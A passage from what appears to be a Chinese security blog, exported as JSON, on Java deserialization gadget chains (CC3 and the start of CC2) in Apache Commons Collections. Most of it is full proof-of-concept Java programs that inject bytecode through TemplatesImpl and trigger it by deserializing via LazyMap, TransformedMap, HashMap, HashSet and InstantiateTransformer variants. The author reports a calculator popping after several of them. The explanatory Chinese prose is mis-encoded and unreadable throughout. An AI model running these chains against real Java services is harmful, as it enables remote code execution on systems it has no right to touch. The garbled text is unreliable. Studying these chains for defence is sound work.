value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } æˆåŠŸå¼¹å‡ºè®¡ç®—æœºã€‚\nå±€é™ ä¹Ÿå°±æ˜¯CC1çš„å±€é™ï¼Œåœ¨JDK 8u71åå°±ä¸èƒ½å†ä½¿ç”¨äº†ã€‚\nç»“åˆCC6 æµ‹è¯•ç¯å¢ƒï¼š commons-collections 3.2.1 JDK 8u411 CC3ï¼ˆHashMapé“¾ï¼‰ POCï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Map; import java.util.HashMap; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileOutputStream; import java.io.FileInputStream; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(ctf),new InvokerTransformer(\u0026#34;newTransformer\u0026#34;,null,null)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map hashMap = new HashMap(); Map lazy = LazyMap.decorate(hashMap,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap o = new HashMap(); o.put(outerMap,\u0026#34;xxxx\u0026#34;); hashMap.remove(\u0026#34;fupanc\u0026#34;); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } æˆåŠŸå¼¹å‡ºè®¡ç®—æœºã€‚\nCC3ï¼ˆHashSeté“¾ï¼‰ å’ŒHashMapå·®ä¸å¤šï¼ŒPOCå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Map; import java.util.HashMap; import java.util.HashSet; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileOutputStream; import java.io.FileInputStream; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(ctf),new InvokerTransformer(\u0026#34;newTransformer\u0026#34;,null,null)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map hashMap = new HashMap(); Map lazy = LazyMap.decorate(hashMap,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashSet hash = new HashSet(); hash.add(outerMap); hashMap.remove(\u0026#34;fupanc\u0026#34;); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } InstantiateTransformer æµ‹è¯•ç¯å¢ƒï¼š commons-collections 3.2.1 JDK 8u65 åˆ†æ ysoserialçš„CC3çš„POCæ²¡æœ‰ç”¨InvokerTransformeræ¥æ‰§è¡ŒnewTransformeræ–¹æ³•ï¼Œè€Œæ˜¯ç”¨çš„InstantiateTransformerç±»ï¼š InstantiateTransformerç±»ä½äºorg.apache.commons.collections.functors.InstantiateTransformerï¼Œ\næ¥çœ‹è¿™ä¸ªç±»ç”¨åˆ°çš„æºç \næ„é€ æ–¹æ³•ï¼š\ntransformæ–¹æ³•ï¼š\nå¯ä»¥çœ‹åˆ°è¿™é‡Œçš„transformæ–¹æ³•å°±æ˜¯å¯ä»¥å®ä¾‹åŒ–ä¸€ä¸ªç±»çš„ã€‚\nç»§ç»­çœ‹ysoserialçš„åˆ©ç”¨é“¾ï¼š\n1 2 3 4 5 Transformer[] transformers = new Transformer[] { new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer( new Class[] { Templates.class }, new Object[] { templatesImpl } )}; å®ƒå‰é¢ä¼ å…¥äº†ä¸€ä¸ªTrAXFilter.classï¼Œè¿™ä¸ªTrAXFilterç±»ä½ç½®æ˜¯com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilterã€‚\nåœ¨TrAXFilterç±»ä¸­ï¼Œæœ‰åœ°æ–¹è°ƒç”¨äº†newTransformer()æ–¹æ³•ï¼š è¿™ä¹Ÿå°±æ˜¯åœ¨ysoserialåˆ©ç”¨é“¾ä¸­ä¼ å…¥Templates.classçš„åŸå› ï¼ˆTemplatesæ¥å£ç±»ä½äºjavax.xml.transform.Templatesï¼‰ï¼Œç°åœ¨å¤§æ¦‚å°±æ¸…æ¥šäº†ï¼Œ\nåªè¦æˆ‘ä»¬å°†ä¸€ä¸ªè®¾ç½®å¥½äº†çš„TemplatesImplç±»èµ‹å€¼ç»™ä¸€ä¸ªå˜é‡ï¼Œå†å°†é‚£ä¸ªå˜é‡ä¼ è¿›å»å½“åšTrAXFilterçš„å‚æ•°å˜é‡templatesçš„å€¼ï¼Œè¿™æ ·å°±ä¼šè‡ªç„¶è°ƒç”¨åˆ°TemplatesImplç±»çš„newTransformer()æ–¹æ³•ï¼Œè¿˜æ˜¯ç®€å•ç»™ä¸ªä»£ç ï¼Œå°±åƒå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\java_text\\\\java-1\\\\out\\\\production\\\\java-1\\\\Test.class\u0026#34;)); TemplatesImpl templatesImpl = new TemplatesImpl(); setFieldValue(templatesImpl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(templatesImpl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(templatesImpl, \u0026#34;_class\u0026#34;, null); setFieldValue(templatesImpl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] chainPart = new Transformer[]{new ConstantTransformer(TrAXFilter.class),new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl})}; å°±æ˜¯å¦‚ä¸Šï¼Œè¿™æ ·InstantiateTransformerçš„transformer()æ–¹æ³•å°±å¯ä»¥åœ¨è·å–TrAXFilterç±»çš„æ„é€ æ–¹æ³•åå†è°ƒç”¨newInstance()æ–¹æ³•å°†è¿™ä¸ªTrAXFilterç±»å®ä¾‹åŒ–ï¼Œåœ¨å®ä¾‹åŒ–çš„è¿‡ç¨‹ä¸­ï¼Œè‡ªç„¶å°±ä¼šè°ƒç”¨TemplatesImplçš„newTransformer()æ–¹æ³•ï¼š\né‚£ä¹ˆç°åœ¨å°±å¯ä»¥å°è¯•æ„é€ äº†ã€‚\nPOC ç»“åˆCC1 CC1çš„TransformedMapé“¾ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import java.lang.reflect.Field; import java.lang.reflect.Constructor; import java.lang.annotation.Retention; import javax.xml.transform.Templates; import java.lang.Class; import java.util.Map; import java.util.HashMap; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.TransformedMap; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileOutputStream; import java.io.FileInputStream; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl templatesImpl = new TemplatesImpl(); setFieldValue(templatesImpl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(templatesImpl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(templatesImpl, \u0026#34;_class\u0026#34;, null); setFieldValue(templatesImpl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] chainPart = new Transformer[]{new ConstantTransformer(TrAXFilter.class),new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl})}; Transformer chain = new ChainedTransformer(chainPart); Map hashMap = new HashMap(); hashMap.put(\u0026#34;value\u0026#34;,\u0026#34;xxxx\u0026#34;); Map outerMap = TransformedMap.decorate(hashMap,null,chain); Constructor constructor1 = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); Object o = constructor1.newInstance(Retention.class,outerMap); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } æˆåŠŸå¼¹è®¡ç®—æœºã€‚\nCC1çš„LazyMapé“¾ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import java.lang.reflect.Field; import java.lang.reflect.Constructor; import java.lang.annotation.Retention; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import javax.xml.transform.Templates; import java.lang.Class; import java.util.Map; import java.util.HashMap; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.LazyMap; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileOutputStream; import java.io.FileInputStream; import java.nio.file.Files; import java.nio.file.Paths; public class Main { public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] chainPart = new Transformer[]{new ConstantTransformer(TrAXFilter.class),new InstantiateTransformer(new Class[]{Templates.class},new Object[]{ctf})}; Transformer chain = new ChainedTransformer(chainPart); Map hashMap = new HashMap(); Map outerMap = LazyMap.decorate(hashMap,chain); Constructor con = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class,Map.class); con.setAccessible(true); InvocationHandler proxy = (InvocationHandler) con.newInstance(Retention.class,outerMap); Map proxyMap = (Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),proxy); Object o = con.newInstance(Retention.class,proxyMap); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } æˆåŠŸå¼¹è®¡ç®—æœº\nç»“åˆCC6 HashMapé“¾çš„POCï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Map; import java.util.HashMap; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InstantiateTransformer; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javax.xml.transform.Templates; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileOutputStream; import java.io.FileInputStream; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(TrAXFilter.class),new InstantiateTransformer(new Class[]{Templates.class},new Object[]{ctf})}; Transformer chain = new ChainedTransformer(fakeTransformer); Map hashMap = new HashMap(); Map lazy = LazyMap.decorate(hashMap,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap o = new HashMap(); o.put(outerMap,\u0026#34;xxxx\u0026#34;); hashMap.remove(\u0026#34;fupanc\u0026#34;); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } æˆåŠŸå¼¹è®¡ç®—æœº\nHashSeté“¾çš„POCï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Map; import java.util.HashMap; import java.util.HashSet; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InstantiateTransformer; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javax.xml.transform.Templates; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileOutputStream; import java.io.FileInputStream; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(TrAXFilter.class),new InstantiateTransformer(new Class[]{Templates.class},new Object[]{ctf})}; Transformer chain = new ChainedTransformer(fakeTransformer); Map hashMap = new HashMap(); Map lazy = LazyMap.decorate(hashMap,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashSet o = new HashSet(); o.add(outerMap); hashMap.remove(\u0026#34;fupanc\u0026#34;); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } å¥½å¤„ é¦–å…ˆå°±æ˜¯åœ¨åˆ©ç”¨POCçš„æ—¶å€™ä¸€å®šè¦æ³¨æ„javaç‰ˆæœ¬çš„é—®é¢˜ï¼Œç»“åˆCC6çš„åŸºæœ¬åœ¨java7å’Œjava8éƒ½é€šæ€ã€‚\nå¯¹äºä½¿ç”¨InstantiateTransformerç±»ï¼Œå½“ä¸å…è®¸ä½¿ç”¨InvokerTransformerç±»çš„æ—¶å€™å°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªã€‚\n","date":"2025-01-22T13:50:34+08:00","permalink":"https://fupanc-w1n.github.io/p/cc3/","title":"CC3"},{"content":"CC2 common-collection4 å®˜æ–¹è®¤ä¸ºæ—§çš„æ—§çš„common-collectionæœ‰ä¸€äº›ç»“æ„å’ŒAPIè®¾è®¡ä¸Šçš„é—®é¢˜ï¼Œä½†ä¿®å¤è¿™äº›é—®é¢˜ä¼šäº§ç”Ÿå¤§é‡ä¸èƒ½å‘å‰å…¼å®¹çš„æ”¹åŠ¨ã€‚äºæ˜¯æ¨å‡ºçš„common-collection4ä¸å†è®¤ä¸ºæ˜¯ä¸€ä¸ªç”¨æ¥æ›¿æ¢common-collectionçš„æ–°ç‰ˆæœ¬ï¼Œè€Œæ˜¯ä¸€ä¸ªæ–°çš„åŒ…ã€‚\nä¸¤è€…çš„å‘½åç©ºé—´ä¸å†²çªï¼Œå¯ä»¥å…±å­˜åœ¨åŒä¸€ä¸ªé¡¹ç›®ä¸­ã€‚\nåœ¨common-collection4-4.0ä¸‹ï¼Œä¾æ—§èƒ½åˆ©ç”¨common-collection-3.2.1çš„è°ƒç”¨é“¾ï¼Œåªæ˜¯æ¢äº†ä¸ªåŒ…åè€Œå·²ã€‚\nä¾èµ–æ”¹æˆå¦‚ä¸‹å³å¯ï¼š\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.commons\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-collections4\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; é’ˆå¯¹common-collections4ï¼Œysoserialä¹Ÿæ˜¯ç»™å‡ºäº†ä¸¤æ¡ååºåˆ—åŒ–è°ƒç”¨é“¾ï¼Œä¹Ÿå°±æ˜¯cc2å’Œcc4ï¼Œè¿™é‡Œå°±è®²è®²CC2ã€‚\nå‰ç½®çŸ¥è¯† æµ‹è¯•ç¯å¢ƒï¼š commons-collections4.0 JDK 8u411 CC2æœ‰åˆ©ç”¨åˆ°javassistï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦æœ‰javassistçš„å‰ç½®çŸ¥è¯†ã€‚\néœ€è¦äº†è§£çš„ç±» PriorityQueue è¿™ä¸ªç±»ä½äºjava.util.PriorityQueue\nPriorityQueue ä¼˜å…ˆçº§é˜Ÿåˆ—æ˜¯åŸºäºä¼˜å…ˆçº§å †ï¼ˆa priority heapï¼‰çš„ä¸€ç§ç‰¹æ®Šé˜Ÿåˆ—ï¼Œä»–ç»™æ¯ä¸ªå…ƒç´ å®šä¹‰â€œä¼˜å…ˆçº§â€ï¼Œè¿™æ ·å–å‡ºæ•°æ®çš„æ—¶å€™ä¼šæŒ‰ç…§ä¼˜å…ˆçº§æ¥å–ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œä¼˜å…ˆçº§é˜Ÿåˆ—ä¼šæ ¹æ®è‡ªç„¶é¡ºåºå¯¹å…ƒç´ è¿›è¡Œæ’åºã€‚\nå› æ­¤ï¼Œæ”¾å…¥PriorityQueueçš„å…ƒç´ ï¼Œå¿…é¡»å®ç° Comparable æ¥å£ï¼ŒPriorityQueue ä¼šæ›´å…·å…ƒç´ çš„æ’åºé¡ºåºå†³å®šå‡ºå †çš„ä¼˜å…ˆçº§ã€‚å¦‚æœæ²¡æœ‰å®ç° Comparable æ¥å£ï¼ŒPriorityQueue è¿˜å…è®¸æˆ‘ä»¬æä¾›ä¸€ä¸ª Comparator å¯¹è±¡æ¥åˆ¤æ–­ä¸¤ä¸ªå…ƒç´ çš„é¡ºåºã€‚\nåœ¨CC2ä¸­ï¼Œæˆ‘ä»¬å°±æ˜¯è¦åˆ©ç”¨åˆ°PriorityQueueç±»ï¼Œæ¥çœ‹è¿™ä¸ªç±»é‡å†™çš„readObject()æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { s.defaultReadObject(); s.readInt(); SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size); queue = new Object[size]; for (int i = 0; i \u0026lt; size; i++) queue[i] = s.readObject(); heapify(); } è¿™é‡Œå°†æ•°æ®ååºåˆ—åŒ–åˆ°queueä¸­åï¼Œä¼šè°ƒç”¨heapify()æ–¹æ³•æ¥å¯¹æ•°æ®è¿›è¡Œæ’åºã€‚è·Ÿè¿›ä¸€ä¸‹heapify()æ–¹æ³•ï¼š heapify()æ–¹æ³•ä¼šè°ƒç”¨siftDown()ï¼Œç»§ç»­è·Ÿè¿›ï¼š\nå½“comparatorä¸ä¸º null çš„æ—¶å€™ï¼Œå°±ä¼šè°ƒç”¨siftDownUsingComparator()æ–¹æ³•ï¼š\nåœ¨ siftDownUsingComparator() æ–¹æ³•ä¸­ï¼Œä¼šè°ƒç”¨ comparator çš„ compare() æ–¹æ³•æ¥è¿›è¡Œä¼˜å…ˆçº§çš„æ¯”è¾ƒå’Œæ’åºã€‚\nè¿™æ ·ï¼Œååºåˆ—åŒ–ä¹‹åçš„ä¼˜å…ˆçº§é˜Ÿåˆ—ï¼Œä¹Ÿæ‹¥æœ‰äº†é¡ºåºã€‚\nTransformingComparator TransformingComparator æ˜¯è§¦å‘æ¼æ´çš„å…³é”®ï¼Œä»–å°† Transformer æ‰§è¡Œç‚¹å’Œ PriorityQueue è§¦å‘ç‚¹è”ç³»äº†èµ·æ¥ã€‚è¿™ä¸ªç±»ä½äºorg.apache.commons.collections4.comparators.TransformingComparatorã€‚\næ—¢ç„¶è¿™é‡Œéƒ½è¯´åˆ°äº†è”ç³»äº†èµ·æ¥ï¼Œåœ¨PriorityQueue ç±»çš„æœ€åè¯´åˆ°äº† compare() æ–¹æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹TransformingComparator çš„compare()æ–¹æ³•ï¼š è¿™é‡Œå°±è°ƒç”¨åˆ°äº†transform æ–¹æ³•ï¼Œé€šè¿‡çš„æ˜¯this.transformerå¯¹è±¡ï¼Œæ¥çœ‹ä¸€ä¸‹TransformingComparatorçš„æ„é€ æ–¹æ³•ï¼š å¦‚æœåˆå§‹åŒ–çš„æ—¶å€™ä¸æŒ‡å®š Comparatorï¼Œåˆ™ä½¿ç”¨è¿™ä¸ªç±»ç›´æ¥å®šä¹‰çš„çš„ ComparableComparator.comparableComparator()ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ªæ„é€ æ–¹æ³•ï¼Œå¹¶ä¸”æˆ‘ä»¬å°±æ˜¯è¦åˆ©ç”¨ç¬¬ä¸€ä¸ªæ„é€ æ–¹æ³•ã€‚\nè¿™é‡Œå¯ä»¥çœ‹åˆ°æ­£å¥½è¿™ä¸ªthis.transformerå˜é‡æ˜¯æˆ‘ä»¬è¦æ±‚çš„Transformerç±»å‹ã€‚è¿™æ ·æˆ‘ä»¬å°±ä¼ å…¥åŸºæœ¬ç›˜çš„é“¾å­å®ç°æ¼æ´åˆ©ç”¨ã€‚\né“¾å­å¤§æ¦‚å‡ºæ¥äº†ï¼Œç°åœ¨å°±æ˜¯æ¥æ„é€ ã€‚\næ”»å‡»æ„é€  è¿˜æ˜¯ç»™ä¸ªä»£ç æ¥è°ƒè¯•ï¼Œç»“åˆå‰é¢çš„å¤§æ¦‚é“¾å­çš„è¯´æ˜ï¼Œè¿™é‡Œéœ€è¦ç»™å‡ºPriorityQueueå®ä¾‹å’ŒTransformingComparatorå®ä¾‹ï¼Œè¿˜æ˜¯ç®€å•ç»™å‡ºä¸€ä¸ªä»£ç æ¥è°ƒè¯•ã€‚æ¥çœ‹ä¸€ä¸‹æˆ‘ä»¬è¦åˆ©ç”¨åˆ°çš„PriorityQueueç±»çš„æ„é€ æ–¹æ³•ï¼š è¿™é‡Œçš„initialCapacityä¸èƒ½å°äº1ã€‚\nç»“åˆå‰é¢çš„æè¿°ï¼Œæˆ‘ä»¬éœ€è¦å°†è¿™é‡Œçš„this.comparatorè®¾ç½®ä¸ºTransformingComparatorç±»çš„å®ä¾‹ã€‚\né‚£ä¹ˆå°±å¯ä»¥å°è¯•æ„é€ ä¸€ä¸‹ä»£ç äº†ï¼š\nfake:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 package org.example; import java.util.PriorityQueue; import 